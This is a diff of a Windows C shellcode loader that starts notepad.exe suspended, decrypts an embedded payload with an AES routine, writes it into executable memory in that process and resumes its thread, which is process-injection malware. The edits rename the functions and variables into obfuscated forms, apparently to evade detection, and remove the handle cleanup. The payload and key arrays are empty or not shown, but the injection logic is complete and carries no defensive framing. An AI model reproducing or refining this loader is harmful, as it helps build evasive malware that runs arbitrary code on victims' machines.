@@ -6,7 +6,7 @@
 #pragma comment (lib, "crypt32.lib")
 #pragma comment (lib, "user32.lib")
 
-void encaeshello(char* code1299d, DWORD code1299dLen, char* k27eykk, DWORD k27eykkLen) {
+void ases123enc(char* code1299d, DWORD code1299dLen, char* k27eykk, DWORD k27eykkLen) {
     HCRYPTPROV hProv;
     HCRYPTHASH hHash;
     HCRYPTKEY hKey;
@@ -28,7 +28,7 @@ int main() {
     PROCESS_INFORMATION pi = {0};
     ga.cb = sizeof(ga);
     HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
-
+    unsigned char ke185hams[] = {};
     BOOL (*pCreateProcess)(
         LPCSTR lpApplicationName,
         LPSTR lpCommandLine,
@@ -43,7 +43,7 @@ int main() {
     ) = (BOOL(*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))
         GetProcAddress(hKernel32, "CreateProcessA");
 
-    pCreateProcess("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &ga, &pi);
+    pCreateProcess("C:\\Windows\\System32\\notepad.exe", 0, 0, 0, FALSE,CREATE_SUSPENDED, 0, 0, &ga, &pi);
       
 
     
@@ -58,8 +58,7 @@ LPVOID (*pVirtualAllnocEkx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD) =
     (LPVOID(*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(hKernel32, "VirtualAllocEx");
     LPVOID memlo = pVirtualAllnocEkx(pi.hProcess, NULL, sizeof(itsthecod345),MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     
-    unsigned char ke185hams[] = {}; 
-    encaeshello((char*)  itsthecod345, sizeof(itsthecod345), ke185hams, sizeof(ke185hams));
+    ases123enc((char*)  itsthecod345, sizeof(itsthecod345), ke185hams, sizeof(ke185hams));
     
     BOOL (*pWriteProcessM)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*) =
     (BOOL(*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*))GetProcAddress(hKernel32, "WriteProcessMemory");
@@ -70,9 +69,6 @@ LPVOID (*pVirtualAllnocEkx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD) =
 
     ResumeThread(pi.hThread); 
 
-    
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
 
     return 0;
 }
